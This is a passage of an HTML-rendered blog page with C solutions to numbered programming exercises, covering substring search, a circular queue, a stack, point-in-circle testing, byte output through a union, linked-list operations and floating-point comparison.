class="keyword">char</span> *<span class="title">findstr</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">char</span> *t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,flag;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; *(s+i)!=<span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*(s+i)==*t)</span><br><span class="line">        &#123;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>; *(t+j)!=<span class="string">'\0'</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(*(s+i+j)!=*(t+j))</span><br><span class="line">                &#123;</span><br><span class="line">                    flag=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> s+i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *s=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">1001</span>);</span><br><span class="line">    <span class="keyword">char</span> *t=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">1001</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%s%s"</span>,s,t)==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%p %p\n"</span>,s,findstr(s,t));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1064队列操作"><a href="#1064队列操作" class="headerlink" title="1064队列操作"></a>1064队列操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//#define D printf("front=%d\trear=%d\n",front,rear);</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,op,id,front,rear;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)==<span class="number">2</span>)&#123;</span><br><span class="line">            n++;</span><br><span class="line">            datatype* a=(datatype*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(datatype)*(n));</span><br><span class="line">            front=rear=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;op,&amp;id);</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">1</span>==op)&#123;</span><br><span class="line">                <span class="keyword">if</span>((rear+<span class="number">1</span>)%n!=front)&#123;</span><br><span class="line">                    a[rear]=id;</span><br><span class="line">                    rear=(rear+<span class="number">1</span>)%n;</span><br><span class="line">                &#125;                                         <span class="comment">//  D</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="number">2</span>==op)&#123;</span><br><span class="line">                <span class="keyword">if</span>(rear!=front)&#123;</span><br><span class="line">                    front=(front+<span class="number">1</span>)%n;</span><br><span class="line">                &#125;                                          <span class="comment">// D</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(front==rear)&#123;<span class="built_in">printf</span>(<span class="string">"NULL\n"</span>);<span class="keyword">continue</span>;&#125;</span><br><span class="line">       <span class="keyword">while</span>(front!=rear)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[front]);</span><br><span class="line">        front=(front+<span class="number">1</span>)%n;</span><br><span class="line">       &#125;<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1065栈操作"><a href="#1065栈操作" class="headerlink" title="1065栈操作"></a>1065栈操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> *a;</span><br><span class="line"><span class="keyword">int</span> top;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> vol,<span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(top&gt;vol<span class="number">-2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        a[++top]=id;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(<span class="keyword">int</span> vol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(top==<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        top--;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//int debug()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    int i=top;</span></span><br><span class="line"><span class="comment">//    printf("top=%d\t",top);</span></span><br><span class="line"><span class="comment">//    while(i&gt;-1)&#123;</span></span><br><span class="line"><span class="comment">//        printf("%d ",a[i--]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    printf("\n");</span></span><br><span class="line"><span class="comment">//    return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,op,id,i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        a=(<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*n);</span><br><span class="line">        top=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(m--&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;op,&amp;id);</span><br><span class="line">            <span class="keyword">if</span>(op==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                push(n,id);</span><br><span class="line">                <span class="comment">//debug();</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                pop(n);</span><br><span class="line">                <span class="comment">//debug();</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(top==<span class="number">-1</span>)&#123;<span class="built_in">printf</span>(<span class="string">"NULL"</span>);&#125;</span><br><span class="line">        <span class="keyword">while</span>(top&gt;<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[top--]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1066判断点是否在圆上"><a href="#1066判断点是否在圆上" class="headerlink" title="1066判断点是否在圆上"></a>1066判断点是否在圆上</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">&#125;POINT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> m;</span><br><span class="line">    <span class="keyword">double</span> n;</span><br><span class="line">    <span class="keyword">double</span> r;</span><br><span class="line">&#125;CIRCLE;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">in_circle</span><span class="params">(POINT p, CIRCLE c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> temp1=(p.x-c.m)*(p.x-c.m)+(p.y-c.n)*(p.y-c.n);</span><br><span class="line">    <span class="keyword">double</span> temp2=c.r*c.r;</span><br><span class="line">   <span class="keyword">if</span>(temp1-temp2&gt;<span class="number">0</span>)&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(temp1-temp2&lt;<span class="number">0</span>)&#123;<span class="keyword">return</span> <span class="number">2</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    POINT p;</span><br><span class="line">    CIRCLE c;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%lf%lf%lf%lf%lf"</span>,&amp;p.x,&amp;p.y,&amp;c.m,&amp;c.n,&amp;c.r)==<span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,in_circle(p,c));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1067字节输出"><a href="#1067字节输出" class="headerlink" title="1067字节输出"></a>1067字节输出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">union</span> my_union</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> b[<span class="keyword">sizeof</span>(<span class="keyword">int</span>)];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">union</span> my_union test;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;test.a)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(<span class="keyword">int</span>);i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%.2X"</span>,test.b[i]);</span><br><span class="line">        &#125;<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1068链表基本操作"><a href="#1068链表基本操作" class="headerlink" title="1068链表基本操作"></a>1068链表基本操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NODE</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; node;</span><br><span class="line">node *head;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addNode</span><span class="params">(idx,val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node *p=head;</span><br><span class="line">    node*q;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i!=idx&amp;&amp;p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    q=(node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    q-&gt;val=val;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;next=q;</span><br><span class="line">        q-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        q-&gt;next=p-&gt;next;</span><br><span class="line">        p-&gt;next=q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">editNode</span><span class="params">(idx,val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node* p=head;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i!=idx&amp;&amp;p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;val=val;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delNode</span><span class="params">(idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node* p=head;</span><br><span class="line">    node*q;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i!=idx&amp;&amp;p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q=p;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    q-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">appearNode</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node* p=head;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i!=idx&amp;&amp;p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,p-&gt;val);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//int debug()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    node* p=head;</span></span><br><span class="line"><span class="comment">//    while(p!=NULL)&#123;</span></span><br><span class="line"><span class="comment">//        printf("%d-&gt;",p-&gt;val);p=p-&gt;next;</span></span><br><span class="line"><span class="comment">//    &#125;printf("\n");</span></span><br><span class="line"><span class="comment">//    return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> op,idx,val;</span><br><span class="line">    head=(node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    head-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    head-&gt;val=<span class="number">111</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;op,&amp;idx,&amp;val)==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(op!=<span class="number">1</span>&amp;&amp;op!=<span class="number">2</span>&amp;&amp;op!=<span class="number">3</span>&amp;&amp;op!=<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addNode(idx,val);</span><br><span class="line">            <span class="comment">//debug();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            editNode(idx,val);</span><br><span class="line">            <span class="comment">//debug();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            delNode(idx);</span><br><span class="line">            <span class="comment">//debug();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            appearNode(idx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1069浮点精确数"><a href="#1069浮点精确数" class="headerlink" title="1069浮点精确数"></a>1069浮点精确数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">    <span class="keyword">double</span> a,b,delta;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d%lf%lf"</span>,&amp;p,&amp;a,&amp;b)==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        delta=<span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">while</span>(p--&gt;<span class="number">0</span>)&#123;delta/=<span class="number">10</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">fabs</span>(a-b)&lt;delta)&#123;<span class="built_in">printf</span>(<span class="string">"0\n"</span>);&#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a-b&lt;<span class="number">0</span>)&#123;<span class="built_in">printf</span>(<span class="string">"-1\n"</span>);&#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="built_in">printf</span>(<span class="string">"1\n"</span>);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1070三角形归类"><a href="#1070三角形归类" class="headerlink" title="1070三角形归类"></a>1070三角形归类</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 